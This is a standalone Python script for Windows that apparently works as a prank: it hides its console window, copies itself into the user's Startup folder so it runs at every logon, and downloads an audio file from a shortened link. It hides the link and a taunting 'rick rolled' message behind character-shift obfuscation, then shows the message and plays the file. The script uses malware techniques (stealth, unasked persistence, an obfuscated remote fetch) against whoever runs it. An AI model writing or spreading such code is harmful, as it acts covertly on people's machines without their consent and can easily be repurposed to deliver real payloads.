import requests,ctypes,os,winsound,sys
from threading import Thread
import shutil
ctypes.WinDLL('user32').ShowWindow(ctypes.WinDLL('kernel32').GetConsoleWindow(), 0)
usr=str(os.getenv('username'))
curpath,curname=os.path.abspath(__file__),os.path.basename(__file__)
stdir=f'C:\\Users\\{usr}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{curname}'
if not os.path.exists(stdir) and not os.path.exists(stdir[0:-3]+'.exe'):
    try:
        shutil.copyfile(curpath,stdir)
    except:
        stdir=stdir[0:-3]+'.exe'
        curpath=curpath[0:-3]+'.exe'
        shutil.copyfile(curpath,stdir)
if sys.version_info.major >= 3:
    MessageBox = ctypes.windll.user32.MessageBoxW
else:
    MessageBox = ctypes.windll.user32.MessageBoxA
def sndmsg(mtxt):
    MessageBox(None, mtxt, 'read carefully', 0)
vfn=str(os.getenv('APPDATA'))+'\\'+''.join([chr(ord(i)-2) for i in 'cdqwv0ycx'])
if not os.path.exists(vfn):
    r = requests.get(''.join([chr(ord(i)-3) for i in 'kwwsv=22elw1o|26wXXLf4']))
    with open(vfn, 'wb') as fob:
        fob.write(r.content)
txtip=''.join([chr(ord(i)-2) for i in 'jgjg"igv"tkem"tqnngf'])+', '+usr+'!'
t = Thread(target=sndmsg, args=(txtip,))
t.start()
winsound.PlaySound(vfn, winsound.SND_ALIAS)
os.remove(vfn)
